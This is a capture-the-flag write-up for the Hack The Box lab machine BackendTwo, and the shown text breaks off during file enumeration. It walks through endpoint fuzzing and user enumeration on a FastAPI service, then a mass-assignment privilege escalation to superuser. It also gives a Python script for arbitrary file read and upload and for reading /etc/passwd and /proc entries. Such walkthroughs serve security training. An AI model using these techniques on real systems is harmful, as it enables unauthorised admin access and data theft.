# BackendTwo

![BackendTwo.png](BackendTwo.png)

## TOC

- [BackendTwo](#backendtwo)
  - [TOC](#toc)
  - [Port Scan](#port-scan)
  - [User](#user)
    - [Directory Busting: docs, api](#directory-busting-docs-api)
    - [UHC User Enumeration](#uhc-user-enumeration)
    - [Directory Busting: edit, password, signup, login](#directory-busting-edit-password-signup-login)
    - [Create User and Login](#create-user-and-login)
    - [API Documentation](#api-documentation)
    - [Mass Assignment in /api/v1/user/{user\_id}/edit](#mass-assignment-in-apiv1useruser_idedit)
    - [Download File Feature](#download-file-feature)
    - [Upload file Feature](#upload-file-feature)
    - [Enumeration /proc/{pid}/cmdline](#enumeration-procpidcmdline)
    - [Get and Review Source Code](#get-and-review-source-code)
    - [Encode JWT with Debug key](#encode-jwt-with-debug-key)
    - [Foothold: Modifying source code](#foothold-modifying-source-code)
    - [Foothold: Using password in `auth.log`](#foothold-using-password-in-authlog)
  - [Root](#root)
  - [Flag](#flag)

## Port Scan

<details><summary>Nmap result (click here)</summary><p>

```console
root@kali:~/htb/Machines/BackendTwo# nmap -p- --min-rate 5000 -sVC --open 10.129.163.119
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-01 14:27 JST
Nmap scan report for 10.129.163.119
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    uvicorn
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: uvicorn
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     date: Tue, 01 Aug 2023 05:27:39 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest:
|     HTTP/1.1 200 OK
|     date: Tue, 01 Aug 2023 05:27:23 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC Api v2.0"}
|   HTTPOptions:
|     HTTP/1.1 405 Method Not Allowed
|     date: Tue, 01 Aug 2023 05:27:30 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94%I=7%D=8/1%Time=64C897C8%P=x86_64-pc-linux-gnu%r(GetRe
(snip)
SF:close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.17 seconds
```

</p></details>

22/tcp SSH and 80/tcp HTTP is open.
Adding `10.129.163.119 backendtwo.htb` to `/etc/hosts`.

## User

### Directory Busting: docs, api

```console
root@kali:~/htb/Machines/BackendTwo# curl -D- http://backendtwo.htb/
HTTP/1.1 200 OK
date: Tue, 01 Aug 2023 05:30:36 GMT
server: uvicorn
content-length: 22
content-type: application/json

{"msg":"UHC Api v2.0"}
```

JSON returned.
I will use `ffuf` to find the endpoint.

```console
root@kali:~/htb/Machines/BackendTwo# ffuf -ic -u http://backendtwo.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://backendtwo.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 19, Words: 1, Lines: 1, Duration: 228ms]
    * FUZZ: api

[Status: 401, Size: 30, Words: 2, Lines: 1, Duration: 195ms]
    * FUZZ: docs

:: Progress: [4715/4715] :: Job [1/1] :: 70 req/sec :: Duration: [0:01:02] :: Errors: 0 ::
```

`/api` and `/docs` endpoints were found.

The endpoint is named `/api` and the response body is JSON, so I seem that it's WEB API.
The name of this machine is BackendTwo, which means that it targets the backend server in the WEB Application.

First, look at the `/docs` endpoint.

```console
root@kali:~/htb/Machines/BackendTwo# curl -s -D- http://backendtwo.htb/docs
HTTP/1.1 401 Unauthorized
date: Tue, 01 Aug 2023 05:43:05 GMT
server: uvicorn
www-authenticate: Bearer
content-length: 30
content-type: application/json

{"detail":"Not authenticated"}
```

There is a [WWW-Authenticate](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate) header that defines the authentication method so authentication is required to make a request to this endpoint.
The value of the `www-authenticate` header is `Bearer`, so some kind of token is required.

In general, I seem a situation where the token is obtained by using the application's user login function.
This WEB API may also have a login function.

Next, look at the `/api` endpoint.

```console
root@kali:~/htb/Machines/BackendTwo# curl -s -D- http://backendtwo.htb/api
HTTP/1.1 200 OK
date: Tue, 01 Aug 2023 05:50:55 GMT
server: uvicorn
content-length: 19
content-type: application/json

{"endpoints":"/v1"}

root@kali:~/htb/Machines/BackendTwo# curl -s -D- http://backendtwo.htb/api/v1
HTTP/1.1 200 OK
date: Tue, 01 Aug 2023 05:50:58 GMT
server: uvicorn
content-length: 32
content-type: application/json

{"endpoints":["/user","/admin"]}
```

`/api/v1/user` and `/api/v1/admin` endpoints were found.

```console
root@kali:~/htb/Machines/BackendTwo# curl -s -D- http://backendtwo.htb/api/v1/admin/
HTTP/1.1 401 Unauthorized
date: Tue, 01 Aug 2023 06:09:33 GMT
server: uvicorn
www-authenticate: Bearer
content-length: 30
content-type: application/json

{"detail":"Not authenticated"}
```

As well as `/docs`, Authentication is required to access the `/api/v1/admin/` endpoint.


```console
root@kali:~/htb/Machines/BackendTwo# curl -s -D- http://backendtwo.htb/api/v1/user
HTTP/1.1 404 Not Found
date: Tue, 01 Aug 2023 05:55:06 GMT
server: uvicorn
content-length: 22
content-type: application/json

{"detail":"Not Found"}

root@kali:~/htb/Machines/BackendTwo# curl -s -D- http://backendtwo.htb/api/v1/user/1
HTTP/1.1 200 OK
date: Tue, 01 Aug 2023 05:55:15 GMT
server: uvicorn
content-length: 175
content-type: application/json

{"guid":"25d386cd-b808-4107-8d3a-4277a0443a6e","email":"admin@backendtwo.htb","profile":"UHC Admin","last_update":null,"time_created":1650987800991,"is_superuser":true,"id":1}
```

The response status of the `/api/v1/user` endpoint was 404.
Looking at the URL naming, I think this WEB API to be a RESTFul like API.
The RESTFul API has a URL pathname of `/<resource>/<id>`, so I added 1 after `/api/v1/user` and executed the request, and the resource was returned.

### UHC User Enumeration

Found `admin@backendtwo.htb` user whose user ID is 1.
I will change the user ID and request to find other users.

```console
root@kali:~/htb/Machines/BackendTwo# for i in $(seq 1 13); do curl -s http://backendtwo.htb/api/v1/user/$i; echo '\n\n'; done
{"guid":"25d386cd-b808-4107-8d3a-4277a0443a6e","email":"admin@backendtwo.htb","profile":"UHC Admin","last_update":null,"time_created":1650987800991,"is_superuser":true,"id":1}

(snip)

{"guid":"e412dc13-282f-45d8-80e3-7cabb5e73373","email":"freddie@backendtwo.htb","profile":"UHC Player","last_update":null,"time_created":1650987948365,"is_superuser":false,"id":11}

null

null
```

There are 1-11 user IDs and no user IDs above 12.
The response body is JSON with fields such as `guid`, `email`, `profile`, and `is_superuser`.

Only the user `admin@backendtwo.htb` has the value `true` for `is_superuser`, all other users have `false`.
The value of this field controls access, and there may be differences in the API that each user can execute.


### Directory Busting: edit, password, signup, login

I found an endpoint that requires authentication, but nothing more, so look for more endpoints.
I try `/api/v1/user/{user_id}/{user_id}/FUZZ` as it may be possible to perform some operations on the user's resources.

```console
root@kali:~/htb/Machines/BackendTwo# curl -X POST -s -D- http://backendtwo.htb/api/v1/user/1/a
HTTP/1.1 404 Not Found
date: Tue, 01 Aug 2023 06:27:25 GMT
server: uvicorn
content-length: 22
content-type: application/json

{"detail":"Not Found"}

root@kali:~/htb/Machines/BackendTwo# curl -X POST -s -D- http://backendtwo.htb/api/v1/user/1/1
HTTP/1.1 404 Not Found
date: Tue, 01 Aug 2023 06:27:29 GMT
server: uvicorn
content-length: 22
content-type: application/json

{"detail":"Not Found"}
```

I will execute `ffuf` with the baseline as the 404 response status code, so specifying the `-mc all` and `-fc 404` option to ignore the 404 response status code.

```console
root@kali:~/htb/Machines/BackendTwo# ffuf -ic -u http://backendtwo.htb/api/v1/user/1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -fc 404

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://backendtwo.htb/api/v1/user/1/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

[Status: 405, Size: 31, Words: 3, Lines: 1, Duration: 292ms]
    * FUZZ: edit

[Status: 405, Size: 31, Words: 3, Lines: 1, Duration: 210ms]
    * FUZZ: password

:: Progress: [4715/4715] :: Job [1/1] :: 73 req/sec :: Duration: [0:01:02] :: Errors: 0 ::
```

`/api/v1/user/{user_id}/edit` and `/api/v1/user/{user_id}/password` endpoints were found.

As indicated by the response status code [405 Method Not Allowed](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/405), it can not request with GET method on this endpoint.

So I try another request method.
However, HEAD and OPTIONS are not resource-accessing methods and may generate noise, so we omit them.

```console
root@kali:~/htb/Machines/BackendTwo# cat methods.txt
GET
POST
PUT
PATCH
DELETE

root@kali:~/htb/Machines/BackendTwo# cat paths.txt
edit
password

root@kali:~/htb/Machines/BackendTwo# ffuf -X METHOD -u http://backendtwo.htb/api/v1/user/1/PATH -w methods.txt:METHOD -w paths.txt:PATH -mc all -fc 405

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : METHOD
 :: URL              : http://backendtwo.htb/api/v1/user/1/PATH
 :: Wordlist         : METHOD: /root/htb/Machines/BackendTwo/methods.txt
 :: Wordlist         : PATH: /root/htb/Machines/BackendTwo/paths.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 405
________________________________________________

[Status: 401, Size: 30, Words: 2, Lines: 1, Duration: 207ms]
    * METHOD: PUT
    * PATH: password

[Status: 401, Size: 30, Words: 2, Lines: 1, Duration: 409ms]
    * METHOD: PUT
    * PATH: edit

:: Progress: [10/10] :: Job [1/1] :: 24 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

PUT `password` and PUT `edit` endpoints were found.
However, at this point, these endpoints are not yet available because we have not obtained the credentials.

Next, I try `/api/v1/user/FUZZ`.

```console
root@kali:~/htb/Machines/BackendTwo# curl -s -D- http://backendtwo.htb/api/v1/user/a
HTTP/1.1 422 Unprocessable Entity
date: Tue, 01 Aug 2023 06:40:49 GMT
server: uvicorn
content-length: 104
content-type: application/json

{"detail":[{"loc":["path","user_id"],"msg":"value is not a valid integer","type":"type_error.integer"}]}

root@kali:~/htb/Machines/BackendTwo# curl -s -D- http://backendtwo.htb/api/v1/user/99
HTTP/1.1 200 OK
date: Tue, 01 Aug 2023 06:40:54 GMT
server: uvicorn
content-length: 4
content-type: application/json

null

root@kali:~/htb/Machines/BackendTwo# curl -X POST -s -D- http://backendtwo.htb/api/v1/user/a
HTTP/1.1 405 Method Not Allowed
date: Tue, 01 Aug 2023 06:44:49 GMT
server: uvicorn
content-length: 31
content-type: application/json

{"detail":"Method Not Allowed"}
```

Specifying the response body size and a portion of the user's JSON response in a regular expression to filter, I will execute `ffuf`.


```console
root@kali:~/htb/Machines/BackendTwo# ffuf -X METHOD -u http://backendtwo.htb/api/v1/user/PATH -w methods.txt:METHOD -w /usr/share/seclists/Discovery/Web-Content/common.txt:PATH -mc all -fc 404 -fs 104,4,31 -fr '"email":".*","profile":"UHC*'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : METHOD
 :: URL              : http://backendtwo.htb/api/v1/user/PATH
 :: Wordlist         : METHOD: /root/htb/Machines/BackendTwo/methods.txt
 :: Wordlist         : PATH: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
 :: Filter           : Response size: 104,4,31
 :: Filter           : Regexp: "email":".*","profile":"UHC*
________________________________________________

(snip)

[Status: 422, Size: 172, Words: 3, Lines: 1, Duration: 229ms]
    * METHOD: POST
    * PATH: login

[Status: 422, Size: 81, Words: 2, Lines: 1, Duration: 285ms]
    * METHOD: POST
    * PATH: signup

:: Progress: [23575/23575] :: Job [1/1] :: 70 req/sec :: Duration: [0:05:00] :: Errors: 0 ::
```

POST `/api/v1/user/login` and POST `/api/v1/user/signup` endpoints were found.

### Create User and Login

```console
root@kali:~/htb/Machines/BackendTwo# curl -X POST -s http://backendtwo.htb/api/v1/user/login
{"detail":[{"loc":["body","username"],"msg":"field required","type":"value_error.missing"},{"loc":["body","password"],"msg":"field required","type":"value_error.missing"}]}

root@kali:~/htb/Machines/BackendTwo# curl -X POST -s http://backendtwo.htb/api/v1/user/signup
{"detail":[{"loc":["body"],"msg":"field required","type":"value_error.missing"}]}
```

Searching for a portion of the response body, I found a Python web framework [FastAPI](https://github.com/tiangolo/fastapi).
I think this API is built with FastAPI.

[Redundant "value_error.missing" messages for body params in request with empty body. · Issue #4300 · tiangolo/fastapi](https://github.com/tiangolo/fastapi/issues/4300)

> '{"detail":[{"loc":["body","param1"],"msg":"field required","type":"value_error.missing"},(snip)

```json
{"loc":["body"],"msg":"field required","type":"value_error.missing"}
```

This means that the request body is missing, so I will specify an correct request body.

```console
root@kali:~/htb/Machines/BackendTwo# curl -X POST -s http://backendtwo.htb/api/v1/user/signup -d 'a'
{"detail":[{"loc":["body"],"msg":"value is not a valid dict","type":"type_error.dict"}]}
```

The error message changed to `value is not a valid dict`

I think that dict is Python's [Dictionaries](https://docs.python.org/3/tutorial/datastructures.html#dictionaries), so I request with the format key=value.
I will specify `Content-Type: application/x-www-urlencoded` request header also.

```console
root@kali:~/htb/Machines/BackendTwo# curl -X POST -s http://backendtwo.htb/api/v1/user/signup -H "Content-Type: application/x-www-urlencoded" -d 'email=a@example.com&password=password'
{"detail":[{"loc":["body"],"msg":"value is not a valid dict","type":"type_error.dict"}]}
```

There was no change in the error message.
I try to request with JSON.

```console
root@kali:~/htb/Machines/BackendTwo# curl -X POST -s http://backendtwo.htb/api/v1/user/signup -H "Content-Type: application/json" -d '{"email":"a@example.com","password":"password"}'
{"detail":[{"loc":["body","email"],"msg":"value is not a valid email address","type":"value_error.email"}]}
```

The JSON request body seems to be interpreted without problems.
However, the E-mail address sent is incorrect.
I will set E-mail domain with `@backendtwo.htb` as well as the existing user's e-mail address.

```console
root@kali:~/htb/Machines/BackendTwo# curl -X POST -s http://backendtwo.htb/api/v1/user/signup -H "Content-Type: application/json" -d '{"email":"a@backendtwo.htb","password":"password"}'
HTTP/1.1 201 Created
date: Tue, 01 Aug 2023 07:36:28 GMT
server: uvicorn
content-length: 2
content-type: application/json

{}
```

User has been successfully created so I try to login with this email and password.

```console
root@kali:~/htb/Machines/BackendTwo# curl -X POST -s http://backendtwo.htb/api/v1/user/login -H "Content-Type: application/json" -d '{"email":"a@backendtwo.htb","password":"password"}'
{"detail":[{"loc":["body","username"],"msg":"field required","type":"value_error.missing"},{"loc":["body","password"],"msg":"field required","type":"value_error.missing"}]}
```

An error was returned with username and password missing.

```console
root@kali:~/htb/Machines/BackendTwo# curl -X POST -s http://backendtwo.htb/api/v1/user/login -H "Content-Type: application/json" -d '{"aa'
{"detail":[{"loc":["body","username"],"msg":"field required","type":"value_error.missing"},{"loc":["body","password"],"msg":"field required","type":"value_error.missing"}]}
```

Sending a JSON body with syntax problems does not change the error message.
Therefore, I think the request body is not being interpreted as JSON.

I will request in a different format than JSON.

```console
root@kali:~/htb/Machines/BackendTwo# curl -X POST -s http://backendtwo.htb/api/v1/user/login -H "Content-Type: application/x-www-urlencoded" -d 'username=a@backendtwo.htb&password=password'
{"detail":[{"loc":["body","username"],"msg":"field required","type":"value_error.missing"},{"loc":["body","password"],"msg":"field required","type":"value_error.missing"}]}
```

Even `application/x-www-urlencoded` does not work.
I try with a Form.

If we send a Form of type `Content-Type: multipart/form-data` with `curl`, we can specify the `-F` option.
The `Content-Type` request header is given by `curl` so we don't need to specify `Content-Type` header.

[curl - How To Use](https://curl.se/docs/manpage.html#-F)

> -F, --form <name=content>
> (HTTP SMTP IMAP) For HTTP protocol family, this lets curl emulate a filled-in form in which a user has pressed the submit button. This causes curl to POST data using the Content-Type multipart/form-data according to RFC 2388.

```console
root@kali:~/htb/Machines/BackendTwo# curl -X POST -s http://backendtwo.htb/api/v1/user/login -F "username=a@backendtwo.htb" -F "password=password"
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjkxNTY3MTgzLCJpYXQiOjE2OTA4NzU5ODMsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjllOTAxMjEyLTA1YWYtNDJlNC1hYTljLTVkOGNlYjQzZGVjOCJ9._1Iyg6i2KL8DyOFDJh5gkK7Op7cU9S3VsU71AFcf4Pw","token_type":"bearer"}
```

Token returned.
Using this, I try to request to the endpoint that returned `401 Unauthorized`.

### API Documentation

```console
root@kali:~/htb/Machines/BackendTwo# TOKEN=eyJ(snip)f4Pw

root@kali:~/htb/Machines/BackendTwo# curl -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/docs

    <!DOCTYPE html>
(snip)
    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@4/swagger-ui-bundle.js"></script>
    <!-- `SwaggerUIBundle` is now available on the page -->
    <script>
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
(snip)
```

When I request to the GET `/docs` endpoint using the gotten token returned HTML, it returns HTML not JSON.
This is [Swagger UI](https://swagger.io/tools/swagger-ui/).

Swagger UI is a web page to host the document of the WEB API.
API files in JSON or YAML format can be imported into Swagger UI to display the document.

As the request body contains `url: '/openapi.json'`, which is JSON type document.

```console
root@kali:~/htb/Machines/BackendTwo# curl -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/openapi.json -O

root@kali:~/htb/Machines/BackendTwo# file openapi.json
openapi.json: JSON text data
```

Now that I got the API documentation, let's look at it in the Swagger UI.
Hosting Swagger UI on a localhost using Docker and import it.

```console
root@kali:~/htb/Machines/BackendTwo# docker run --rm -p 80:8080 swaggerapi/swagger-editor
```

Click File > Import file:

![swagger-ui-import-api-1.png](swagger-ui-import-api-1.png)

Select openapi.json file downloaded:

![swagger-ui-import-api-2.png](swagger-ui-import-api-2.png)

it display API document:

![swagger-ui-import-api-3.png](swagger-ui-import-api-3.png)

There are several interesting endpoints directly under `/api/v1/admin`.

- GET `/api/v1/admin/get_user_flag`
- GET `/api/v1/admin/file/{file_name}`
- POST `/api/v1/admin/file/{file_name}`

```console
root@kali:~/htb/Machines/BackendTwo# curl -s -D- -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/admin/
file/aaa
HTTP/1.1 401 Unauthorized
date: Tue, 01 Aug 2023 08:08:35 GMT
server: uvicorn
www-authenticate: Bearer
content-length: 43
content-type: application/json

{"detail":"Could not validate credentials"}
```

However, I seem that administrative credentials are required to execute these endpoints.

### Mass Assignment in /api/v1/user/{user_id}/edit

I haven't tried the PUT `/api/v1/user/{user_id}/edit` endpoint yet.
Looking at the API documentation, it looks like I can modify the user's `profile` field.

![swagger-ui-put-edit.png](swagger-ui-put-edit.png)

```console
root@kali:~/htb/Machines/BackendTwo# curl -X PUT -s  -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/user/12/edit -H "Content-Type: application/json" -d '{"profile":"a"}'
{"result":"true"}

root@kali:~/htb/Machines/BackendTwo# curl -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/user/12
{"guid":"9e901212-05af-42e4-aa9c-5d8ceb43dec8","email":"a@backendtwo.htb","profile":"a","last_update":null,"time_created":1690875388541,"is_superuser":false,"id":12}
```

I have changed the value of the `profile` field.
Now I try to see if it is possible to change other fields at the same time.
The `is_superuser` field is particularly interesting.

```console
root@kali:~/htb/Machines/BackendTwo# curl -X PUT -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/user/12/edit -H "Content-Type: application/json" -d '{"profile":"a","is_superuser":true}'
{"result":"true"}

root@kali:~/htb/Machines/BackendTwo# curl -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/user/12
{"guid":"9e901212-05af-42e4-aa9c-5d8ceb43dec8","email":"a@backendtwo.htb","profile":"a","last_update":null,"time_created":1690875388541,"is_superuser":true,"id":12}
```

I was able to change `is_superuser` to `true`.
This endpoint is [Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html) vulnerable.
Now user whose ID is 12 can become a superuser.

```console
root@kali:~/htb/Machines/BackendTwo# curl -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/admin/
{"results":false}

root@kali:~/htb/Machines/BackendTwo# curl -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/admin/get_user_flag
{"detail":"Not Authorized"}
```

However, the `/api/v1/admin/` endpoint returns still `Not Authorized`.

Here, I will decode JWT with [The JSON Web Token Toolkit v2](https://github.com/ticarpi/jwt_tool).
It can also be decoded with Auth0's [jwt.io](https://jwt.io/).

```console
root@kali:~/htb/Machines/BackendTwo# python3 ~/tools/jwt_tool/jwt_tool.py $TOKEN
(snip)
=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] type = "access_token"
[+] exp = 1691567183    ==> TIMESTAMP = 2023-08-09 16:46:23 (UTC)
[+] iat = 1690875983    ==> TIMESTAMP = 2023-08-01 16:46:23 (UTC)
[+] sub = "12"
[+] is_superuser = False
[+] guid = "9e901212-05af-42e4-aa9c-5d8ceb43dec8"
(snip)
```

It says `is_superuser = False`.
I assume that it is an implementation that decodes the JWT sent on the server side, judges this `is_superuser` and branch the processing.

I will login to retrieve the JWT again and decode it.

```console
root@kali:~/htb/Machines/BackendTwo# curl -X POST -s http://backendtwo.htb/api/v1/user/login -F "username=a@backendtwo.htb" -F "password=password"
{"access_token":"eyJh(snip)nk","token_type":"bearer"}

root@kali:~/htb/Machines/BackendTwo# TOKEN=eyJh(snip)nk

root@kali:~/htb/Machines/BackendTwo# python3 ~/tools/jwt_tool/jwt_tool.py $TOKEN
(snip)
[+] is_superuser = True
```

It says `is_superuser = True`.

```console
root@kali:~/htb/Machines/BackendTwo# curl -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/admin/
{"results":true}
```

User whose ID is 12 got superuser privileges.

```console
root@kali:~/htb/Machines/BackendTwo# curl -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/admin/get_user_flag
{"file":"[REDACTED]\n"}
```

Also, got flag, which could be submitted to Hack The Box as a user flag.

### Download File Feature

![swagger-ui-get-file.png](swagger-ui-get-file.png)

The `/api/v1/admin/file/{file_name}` endpoint's `{file_name}` parameter must be a base64-encoded filename.

```console
root@kali:~/htb/Machines/BackendTwo# echo -ne '/etc/hostname' | base64
L2V0Yy9ob3N0bmFtZQ==

root@kali:~/htb/Machines/BackendTwo# curl -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/admin/file/L2V0Yy9ob3N0bmFtZQ==
{"file":"BackendTwo\n"}

root@kali:~/htb/Machines/BackendTwo# curl -s -H "Authorization: Bearer $TOKEN" http://backendtwo.htb/api/v1/admin/file/L2V0Yy9ob3N0bmFtZQ== | jq '.file' -r
BackendTwo
```

I got the contents of `/etc/hostname`.

Since it will be executed many times, I implemented Python script.
(I also implemented the `/proc/{pid}/cmdline` enumeration and file upload function, which will be called later.)

<details><summary>file.py</summary><p>

```python
import requests
import base64
from concurrent.futures import ThreadPoolExecutor
import argparse

TOKEN = "ey(snip)c"

HOST = "backendtwo.htb"

s = requests.Session()
# s.proxies = {"http": "http://127.0.0.1:8080"}


def get_file(filename: str) -> None:
    base64encoded_file = base64.b64encode(filename.encode()).decode()

    headers = {"Authorization": f"Bearer {TOKEN}"}

    res = s.get(
        f"http://{HOST}/api/v1/admin/file/{base64encoded_file}", headers=headers
    )

    if res.status_code == 200:
        try:
            if res.headers["Content-Type"] != "application/json":
                print(res.content)
            else:
                if len(res.json()["file"]) == 0:
                    return

                print(res.json()["file"])

        except Exception as e:
            print(e)
            print(res.content)


def post_file(filename: str, content: str) -> None:
    base64encoded_file = base64.b64encode(filename.encode()).decode()

    headers = {"Authorization": f"Bearer {TOKEN}"}

    res = s.post(
        f"http://{HOST}/api/v1/admin/file/{base64encoded_file}",
        headers=headers,
        json={"file": content},
    )
    print(f"{res.status_code=}, {res.content}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("action", type=str)
    parser.add_argument("-f", "--filename", type=str)
    parser.add_argument("-c", "--content", type=str)
    parser.add_argument("-l", "--local_filename", type=str)

    args = parser.parse_args()

    if args.action == "get_file":
        get_file(args.filename)

    elif args.action == "proc_enum":
        with ThreadPoolExecutor(max_workers=100) as executor:
            for i in range(1, 9999):
                file = f"/proc/{i}/cmdline"
                executor.submit(get_file, file)

    elif args.action == "send_content":
        post_file(args.filename, args.content)

    elif args.action == "send_file":
        with open(args.local_filename, "r") as f:
            post_file(args.filename, f.read())
```

</p></details>

<details><summary>/etc/passwd</summary><p>

```console
root@kali:~/htb/Machines/BackendTwo# python3 file.py get_file -f /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
